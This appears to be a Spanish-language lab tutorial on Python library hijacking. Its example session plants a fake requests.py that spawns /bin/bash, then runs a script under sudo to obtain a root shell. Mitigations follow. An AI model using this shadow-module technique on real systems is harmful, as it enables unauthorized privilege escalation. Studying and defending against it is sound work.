Funcionamiento del Ataque

   1- **Orden de Búsqueda de Módulos**:


        Python busca primero en el directorio actual desde donde se ejecuta el script. Si encuentra un archivo 
        con el mismo nombre que el módulo que se intenta importar, lo cargará en lugar del módulo original.




  2- **Creación de un Módulo Malicioso**:


        Al crear un archivo con el mismo nombre que un módulo legítimo (por ejemplo, requests.py), se puede 
        inyectar código malicioso que se ejecutará cuando el script intente importar ese módulo.




3- **Ejecución del Código Malicioso**:


        Si el script se ejecuta con privilegios elevados (por ejemplo, usando sudo), el código malicioso se 
        ejecutará con esos privilegios, lo que puede comprometer la seguridad del sistema.

        
**Ejemplo**

iker@181f77f462ad:~$ cat geo_ip.py 

import requests; 

ip = input('Introduce la direccion IP que quieras geolocalizar: ')

respuesta = requests.get(f'http://ip-api.com/json/{ip}')

data = respuesta.json()

print(data)

nano requests.py

import os
os.system('/bin/bash')

iker@181f77f462ad:~$ sudo /usr/bin/python3 /home/iker/geo_ip.py

root@181f77f462ad:/home/iker# whoami

root

root@181f77f462ad:/home/iker# 


**Mitigación**

Para mitigar este tipo de ataques, debemos considerar las siguientes prácticas:


    Evitar el uso de sudo para ejecutar scripts de Python: Siempre que sea posible, evita ejecutar scripts con privilegios elevados.

    Validar el entorno de ejecución: Asegúrate de que el entorno de ejecución no contenga archivos maliciosos con nombres de módulos comunes.

    Usar entornos virtuales: Los entornos virtuales pueden ayudar a aislar las dependencias y reducir el riesgo de conflictos de nombres de módulos.

    Revisar el código fuente: Antes de ejecutar scripts de terceros, revisa el código para detectar posibles importaciones de módulos maliciosos.






